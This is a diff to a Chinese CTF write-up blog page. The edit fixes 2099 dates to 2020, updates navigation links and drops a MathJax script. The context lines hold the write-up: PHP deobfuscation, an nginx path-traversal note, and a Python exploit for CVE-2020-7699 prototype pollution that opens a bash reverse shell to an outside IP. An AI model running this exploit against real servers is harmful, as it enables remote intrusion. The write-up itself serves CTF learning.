@@ -76,8 +76,8 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/" class="article-date">
-  <time datetime="2099-09-28T02:18:17.000Z" itemprop="datePublished">2099-09-28</time>
+      <a href="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/" class="article-date">
+  <time datetime="2020-09-28T02:18:17.000Z" itemprop="datePublished">2020-09-28</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/CTF/">CTF</a>
@@ -137,7 +137,7 @@
 <blockquote>
 <p>/proc/self指向当前进程的/proc/pid/</p>
 <p>/proc/self/root/指向/的符号</p>
-<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png" alt></p>
+<p><img src="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png" alt></p>
 </blockquote>
 <h2 id="👍🙌😃"><a href="#👍🙌😃" class="headerlink" title="👍🙌😃"></a>👍🙌😃</h2><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><p>代码格式化、反混淆，bcrypt爆破，<strong>命令执行</strong></p>
 <p>这个题 我只能说真的牛逼</p>
@@ -146,7 +146,7 @@
 <p>首先是代码格式化，接着就是<strong>理解代码的执行逻辑，顺便改变代码逻辑</strong></p>
 <p>看题解上看的是第一个函数，也就是混淆</p>
 <p>为什么要先看第一个函数</p>
-<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png" alt="image-20200929221307190"></p>
+<p><img src="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png" alt="image-20200929221307190"></p>
 <p>所以我们就想直接看在不同参数下第一个函数执行输出的结果，所以在第一个函数中添加</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😪😗😦😺😲😂😢😼<span class="params">($😳😃😢🙉)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"加密后："</span>.$😳😃😢🙉;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class="line">	$😲😗😦🙅= (<span class="string">"$😳😃😢🙉😲😗😦🙅"</span>)($😳😃😢🙉)/<span class="number">4</span>;</span><br><span class="line">	$😳😂😚😼 = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($😱😧😼🙀 = <span class="number">0</span>;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123;</span><br><span class="line">		$😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">1</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">2</span>].$😳😃😢🙉[$😱😧😼🙀*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">		$😪😾😞😀 =<span class="number">0</span>;</span><br><span class="line">		$😳😂😦😺 =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ($😱😽🙀🙁 =<span class="number">0</span>;$😱😽🙀🙁&lt;<span class="number">8</span>;$😱😽🙀🙁++) &#123;</span><br><span class="line">			<span class="keyword">for</span> ($😱😂🙄🙂=<span class="number">0</span>;$😱😂🙄🙂&lt;<span class="number">16</span>;$😱😂🙄🙂++) &#123;</span><br><span class="line">				<span class="keyword">if</span>($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123;</span><br><span class="line">					$😪😾😞😀=$😱😽🙀🙁;</span><br><span class="line">					$😳😂😦😺 = $😱😂🙄🙂;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$😲😾😦🙄 = $😪😾😞😀*<span class="number">16</span>+$😳😂😦😺;</span><br><span class="line">		$😳😂😚😼 = $😳😂😚😼.(<span class="string">"$😩😂😸🙉"</span>)($😲😾😦🙄);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"原文："</span>.(<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">"$🎁"</span>)($😳😂😚😼);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>之后依次修改代码逻辑，替换其中第一个函数输出结果</p>
@@ -184,7 +184,7 @@
 <p>先说正向代理</p>
 <p>客户端非常明确要访问的服务器地址；服务器只清楚请求来自哪个代理服务器，而不清楚来自哪个具体的客户端；正向代理模式屏蔽或者隐藏了真实客户端信息。</p>
 </blockquote>
-<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png" alt="image-20201004160128766"></p>
+<p><img src="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png" alt="image-20201004160128766"></p>
 <p>上面这个图就很形象了</p>
 <p>多个客户端给服务器发送的请求，nginx服务器接收到之后，</p>
 <p>按照一定的规则分发给了后端的业务处理服务器进行处理了。</p>
@@ -197,7 +197,7 @@
 <p>发现有目录穿越漏洞参考</p>
 <p><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p>
 <p>/static../</p>
-<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png" alt="image-20201004162700298"></p>
+<p><img src="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png" alt="image-20201004162700298"></p>
 <p>之后就是找cve了，比较菜，只能学习</p>
 <p>cve-2020-7699</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">r1 = requests.post(<span class="string">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">"x;process.mainModule.require('child_process').exec('&#123;&#125;');x"</span>.format(cmd))&#125;)</span><br><span class="line">print(r1.text)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">r2 = requests.get(<span class="string">'http://219.219.61.234:20006/'</span>)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>
@@ -266,7 +266,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://pz1o.top/2020/09/28/%E5%A4%8D%E7%8E%B0wp/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -279,10 +279,19 @@
    
   <nav class="article-nav">
     
+      <a href="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            反弹shell总结
+          
+        </div>
+      </a>
     
-      <a href="/2099/09/27/Flag/" class="article-nav-link">
+    
+      <a href="/2020/09/27/BUU%E5%88%B7%E9%A2%98/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">Flag</div>
+        <div class="article-nav-title">BUU刷题(Web)</div>
       </a>
     
   </nav>
@@ -743,22 +752,6 @@
 </style>
     
   </div>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<!-- <script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>-->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 
 </html>
